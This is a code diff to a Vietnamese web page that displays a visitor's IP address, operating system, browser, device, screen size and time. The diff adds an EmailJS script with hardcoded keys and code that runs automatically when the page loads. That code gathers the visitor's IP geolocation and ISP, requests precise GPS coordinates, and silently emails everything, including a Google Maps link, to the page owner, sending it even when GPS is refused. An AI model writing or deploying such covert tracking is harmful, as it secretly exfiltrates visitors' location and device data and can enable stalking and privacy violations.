@@ -1,8 +1,8 @@
-```html
 <!DOCTYPE html>
 <html lang="vi">
 
 <head>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <meta charset="UTF-8">
 
     <meta
@@ -376,182 +376,118 @@
 
 
 <script>
+// CONFIG EMAILJS - Thay thế các thông số của bạn tại đây
+const EMAILJS_PUBLIC_KEY = "0mJTEgZfXIpR2xzYq";
+const EMAILJS_SERVICE_ID = "service_tby2b67";
+const EMAILJS_TEMPLATE_ID = "template_n67i8qh";
 
-/*
-=========================================
-1. LẤY IP PUBLIC
-=========================================
-*/
+// Khởi tạo EmailJS
+(function() {
+    emailjs.init(EMAILJS_PUBLIC_KEY);
+})();
 
-fetch("https://api.ipify.org?format=json")
+// Hàm gửi dữ liệu qua EmailJS
+function sendEmail(templateParams) {
+    emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
+        .then(() => {
+            console.log("Đã gửi thông tin về email thành công!");
+        }, (error) => {
+            console.error("Lỗi khi gửi email:", error);
+        });
+}
 
-    .then(response => {
+// Thu thập thông tin và xử lý gửi đi
+async function collectAndSendVisitorData() {
+    const ua = navigator.userAgent;
 
-        if (!response.ok) {
-            throw new Error("Không thể lấy IP");
+    // 1. Xác định Hệ điều hành
+    let os = "Không xác định";
+    if (ua.includes("Windows NT 10.0")) os = "Windows 10/11";
+    else if (ua.includes("Windows NT 6.1")) os = "Windows 7";
+    else if (ua.includes("Android")) os = "Android";
+    else if (ua.includes("iPhone")) os = "iOS - iPhone";
+    else if (ua.includes("iPad")) os = "iOS - iPad";
+    else if (ua.includes("Mac OS X")) os = "macOS";
+    else if (ua.includes("Linux")) os = "Linux";
+
+    // 2. Xác định Trình duyệt
+    let browser = "Không xác định";
+    if (ua.includes("Edg/")) browser = "Microsoft Edge";
+    else if (ua.includes("OPR/")) browser = "Opera";
+    else if (ua.includes("Chrome/")) browser = "Google Chrome";
+    else if (ua.includes("Firefox/")) browser = "Mozilla Firefox";
+    else if (ua.includes("Safari/")) browser = "Safari";
+
+    // 3. Loại thiết bị, màn hình, thời gian
+    let device = /Android|iPhone|iPad|iPod/i.test(ua) ? "Điện thoại / Tablet" : "Máy tính";
+    const screenRes = `${window.screen.width} x ${window.screen.height}`;
+    const accessTime = new Date().toLocaleString("vi-VN");
+
+    // Hiển thị giao diện Web
+    document.getElementById("os").textContent = os;
+    document.getElementById("browser").textContent = browser;
+    document.getElementById("device").textContent = device;
+    document.getElementById("screen").textContent = screenRes;
+    document.getElementById("time").textContent = accessTime;
+
+    // 4. Lấy IP Public và vị trí IP qua ipapi.co
+    let ipData = {};
+    try {
+        const response = await fetch("https://ipapi.co/json/");
+        if (response.ok) {
+            ipData = await response.json();
+            document.getElementById("ip").textContent = ipData.ip || "Không lấy được";
+            document.getElementById("ip").classList.remove("loading");
         }
+    } catch (e) {
+        document.getElementById("ip").textContent = "Không lấy được";
+    }
 
-        return response.json();
+    // Khởi tạo đối tượng truyền dữ liệu vào Email Template
+    let templateParams = {
+        ip: ipData.ip || "N/A",
+        city: ipData.city || "N/A",
+        country: ipData.country_name || "N/A",
+        isp: ipData.org || "N/A",
+        device: device,
+        os: os,
+        browser: browser,
+        screen: screenRes,
+        time: accessTime,
+        gps: "Đang kiểm tra...",
+        maps_link: "N/A"
+    };
 
-    })
-
-    .then(data => {
-
-        const ipElement =
-            document.getElementById("ip");
-
-        ipElement.textContent = data.ip;
-
-        ipElement.classList.remove("loading");
-
-    })
-
-    .catch(error => {
-
-        document.getElementById("ip")
-            .textContent = "Không lấy được";
-
-    });
-
-
-/*
-=========================================
-2. USER AGENT
-=========================================
-*/
-
-const ua = navigator.userAgent;
-
-
-/*
-=========================================
-3. HỆ ĐIỀU HÀNH
-=========================================
-*/
-
-let os = "Không xác định";
-
-if (ua.includes("Windows NT 10.0")) {
-
-    os = "Windows 10/11";
-
-}
-else if (ua.includes("Windows NT 6.1")) {
-
-    os = "Windows 7";
-
-}
-else if (ua.includes("Android")) {
-
-    os = "Android";
-
-}
-else if (ua.includes("iPhone")) {
-
-    os = "iOS - iPhone";
-
-}
-else if (ua.includes("iPad")) {
-
-    os = "iOS - iPad";
-
-}
-else if (ua.includes("Mac OS X")) {
-
-    os = "macOS";
-
-}
-else if (ua.includes("Linux")) {
-
-    os = "Linux";
-
+    // 5. Xin cấp quyền GPS lấy vị trí chính xác
+    if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                templateParams.gps = `${lat}, ${lon}`;
+                templateParams.maps_link = `https://www.google.com/maps?q=${lat},${lon}`;
+                
+                // Gửi email sau khi có GPS
+                sendEmail(templateParams);
+            },
+            (error) => {
+                templateParams.gps = "Người dùng từ chối cấp quyền GPS hoặc bị lỗi";
+                // Gửi email chỉ với vị trí IP
+                sendEmail(templateParams);
+            },
+            { timeout: 8000 }
+        );
+    } else {
+        templateParams.gps = "Trình duyệt không hỗ trợ Geolocation";
+        sendEmail(templateParams);
+    }
 }
 
-document.getElementById("os")
-    .textContent = os;
-
-
-/*
-=========================================
-4. TRÌNH DUYỆT
-=========================================
-*/
-
-let browser = "Không xác định";
-
-if (ua.includes("Edg/")) {
-
-    browser = "Microsoft Edge";
-
-}
-else if (ua.includes("OPR/")) {
-
-    browser = "Opera";
-
-}
-else if (ua.includes("Chrome/")) {
-
-    browser = "Google Chrome";
-
-}
-else if (ua.includes("Firefox/")) {
-
-    browser = "Mozilla Firefox";
-
-}
-else if (ua.includes("Safari/")) {
-
-    browser = "Safari";
-
-}
-
-document.getElementById("browser")
-    .textContent = browser;
-
-
-/*
-=========================================
-5. LOẠI THIẾT BỊ
-=========================================
-*/
-
-let device = "Máy tính";
-
-if (/Android|iPhone|iPad|iPod/i.test(ua)) {
-
-    device = "Điện thoại / Tablet";
-
-}
-
-document.getElementById("device")
-    .textContent = device;
-
-
-/*
-=========================================
-6. ĐỘ PHÂN GIẢI
-=========================================
-*/
-
-document.getElementById("screen")
-    .textContent =
-    `${window.screen.width} x ${window.screen.height}`;
-
-
-/*
-=========================================
-7. THỜI GIAN
-=========================================
-*/
-
-document.getElementById("time")
-    .textContent =
-    new Date().toLocaleString("vi-VN");
-
+// Tự động chạy khi trang web hoàn tất tải
+window.addEventListener("DOMContentLoaded", collectAndSendVisitorData);
 </script>
 
 
 </body>
 
 </html>
-```
